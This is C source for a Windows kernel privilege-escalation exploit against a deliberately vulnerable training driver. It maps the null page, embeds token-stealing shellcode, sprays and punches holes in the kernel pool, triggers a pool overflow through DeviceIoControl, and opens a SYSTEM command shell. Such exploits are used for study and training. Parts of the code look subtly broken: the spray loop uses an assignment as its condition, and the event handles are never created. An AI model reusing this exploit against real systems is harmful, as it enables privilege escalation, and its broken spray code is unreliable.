    BOOL MapNullPage() {
        HMODULE hNtdll;
        SIZE_T RegionSize = 0x1000;            // will be rounded up to the next host
                                               // page size address boundary -> 0x2000
        PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
                                               // page size address boundary -> 0x00000000
        NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
        hNtdll = GetModuleHandle("ntdll.dll");
        // Grab the address of NtAllocateVirtualMemory
        NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        if (!NtAllocateVirtualMemory) {
            printf("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        // Allocate the Virtual memory
        NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
            &BaseAddress,
            0,
            &RegionSize,
            MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
            PAGE_EXECUTE_READWRITE);
        if (NtStatus != STATUS_SUCCESS) {
            printf("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
            exit(EXIT_FAILURE);
        }
        else {
            printf("\t\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
            printf("\t\t\t[+] Allocation Size: 0x%X\n", RegionSize);
        }
        FreeLibrary(hNtdll);
        return TRUE;
    }
    char shellcode[] =
    "\x90\x90\x90\x90"              //# NOP Sled
    "\x60"                          //# pushad
    "\x64\xA1\x24\x01\x00\x00"      //# mov eax, fs:[KTHREAD_OFFSET]
    "\x8B\x40\x50"                  //# mov eax, [eax + EPROCESS_OFFSET]
    "\x89\xC1"                      //# mov ecx, eax(Current _EPROCESS structure)
    "\x8B\x98\xF8\x00\x00\x00"      //# mov ebx, [eax + TOKEN_OFFSET]
    "\xBA\x04\x00\x00\x00"          //# mov edx, 4 (SYSTEM PID)
    "\x8B\x80\xB8\x00\x00\x00"      //# mov eax, [eax + FLINK_OFFSET]
    "\x2D\xB8\x00\x00\x00"          //# sub eax, FLINK_OFFSET
    "\x39\x90\xB4\x00\x00\x00"      //# cmp[eax + PID_OFFSET], edx
    "\x75\xED"                      //# jnz
    "\x8B\x90\xF8\x00\x00\x00"      //# mov edx, [eax + TOKEN_OFFSET]
    "\x89\x91\xF8\x00\x00\x00"      //# mov[ecx + TOKEN_OFFSET], edx
    "\x61"                          //# popad
    "\xC2\x10\x00";                 //# ret 16
    void xxCreateCmdLineProcess()
    {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        char szCommandLine[50] = "cmd.exe";
        // 创建cmd子进程;
        BOOL bReturn = CreateProcess(NULL,
            szCommandLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi);
        if (bReturn)
        {
            //不使用的句柄最好关掉;
            printf("process id: %d\n", pi.dwProcessId);
            printf("thread id: %d\n", pi.dwThreadId);
            //WaitForSingleObject(pi.hProcess, INFINITE);
            //CloseHandle(pi.hThread);
            //CloseHandle(pi.hProcess);
        }
        else
        {
            //如果创建进程失败，查看错误码;
            DWORD dwErrCode = GetLastError();
            printf("ErrCode : %d\n", dwErrCode);
        }
    }
    HANDLE GetDeviceHandle(LPCSTR FileName) {
        HANDLE hFile = NULL;
        hFile = CreateFile(FileName,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL);
        return hFile;
    }
    DWORD WINAPI PoolOverflowThread(LPVOID Parameter) {
        ULONG BytesReturned;
        HANDLE hFile = NULL;
        PVOID Memory = NULL;
        LPCSTR FileName = (LPCSTR)DEVICE_NAME;
        // Get the device handle
        printf("\t[+] Getting Device Driver Handle\n");
        printf("\t\t[+] Device Name: %s\n", FileName);
        hFile = GetDeviceHandle(FileName);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            printf("\t\t[+] Device Handle: 0x%X\n", hFile);
        }
        printf("\t[+] Triggering Pool Overflow\n");
        OutputDebugString("****************Kernel Mode****************\n");
        if (!MapNullPage()) {
            printf("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        // Set the DeleteProcedure to the address of our payload
        int shellcode_len = sizeof(shellcode);
        char *pShellcodeBuf = (char*)VirtualAlloc(NULL, shellcode_len, MEM_RESERVE| MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(pShellcodeBuf, shellcode, shellcode_len);
        printf("ShellCode = %x\n", pShellcodeBuf);
        *(PULONG)0x00000060 = (ULONG)pShellcodeBuf;
        //heap spray
        HANDLE spray_event1[10000] = { NULL };
        HANDLE spray_event2[5000] = { NULL };
        for (int i = 0; i = 4989; i--)
        {
            printf("%x\n", spray_event2[i]);
        }
        //制造堆喷区空洞, 目的使我们的数据分配到空洞上;
        for (int i = 0; i < 5000; i = i + 16)
        {
            for (int j = 0; j < 8; j++)
            {
                //一个event对象大小0x40,  0x200的空间需要8个event对象;
                CloseHandle(spray_event2[i + j]);
            }
        }
        //构造数据，覆盖_OBJECT_HEADER偏移+0x00c的值覆盖为0，
        char junk_buffer[504] = { 0x41 };
        memset(junk_buffer, 0x41, 504);
        char overwritedata[41] =
            "\x40\x00\x08\x04"
            "\x45\x76\x65\xee"
            "\x00\x00\x00\x00"
            "\x40\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x01\x00\x00\x00"
            "\x01\x00\x00\x00"
            "\x00\x00\x00\x00"
            "\x00\x00\x08\x00";
        char UserModeBuffer[504 + 40 + 1] = {0};
        int UserModeBufferSize = 504 + 40;
        memcpy(UserModeBuffer, junk_buffer, 504);
        memcpy(UserModeBuffer + 504, overwritedata, 40);
        DeviceIoControl(hFile,
            HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
            (LPVOID)UserModeBuffer,
            (DWORD)UserModeBufferSize,
            NULL,
            0,
            &BytesReturned,
            NULL);
        OutputDebugString("****************Kernel Mode****************\n");
        printf("\t\t[+] Triggering Payload\n");
        printf("\t\t\t[+] Freeing Event Objects\n");
        //这个spray_event1释放循环目前来看，好像不是必须的;
        for (int i = 0; i < 10000; i++)
        {
            CloseHandle(spray_event1[i]);
        }
        //这里i不能从0开始，因为i从0开始的chunk都是我们已经释放的;
        //我们的数据在其中的连续8个chunk上，而被覆盖chunk在释放的chunk后面;
        //所以这里i从8开始;
        for (int i = 8; i < 5000; i = i + 16)
        {
            for (int j = 0; j < 8; j++)
            {
                CloseHandle(spray_event2[i + j]);
            }
        }
        //这里i从0开始，并不能出现想要的结果，反而会造成蓝屏;
        //for (int i = 0; i < 5000; i = i + 16)
        //{
        //  for (int j = 0; j < 8; j++)
        //  {
        //      CloseHandle(spray_event2[i + j]);
        //  }
        //}
        //这样循环也是有可能成功的，当然也可能出现异常情况，比如说，这里面有之前被释放过的chunk，如果被别的程序使用了(重新申请);
        //我们这里强制释放其他程序的chunk，可能造成不可预估的后果;
        //for (int i = 0; i < 5000; i++)
        //{
        //  if (!CloseHandle(spray_event2[i]))
        //  {
        //      printf("\t\t[-] Failed To Close Event Objects Handle: 0x%X\n", GetLastError());
        //  }
        //}
        return EXIT_SUCCESS;
    }
    int main(int argc, char *argv[])
    {
        //printf("hello world\n");
        PoolOverflowThread(NULL);
        printf("start to cmd...\n");
        xxCreateCmdLineProcess();
        return 1;
    }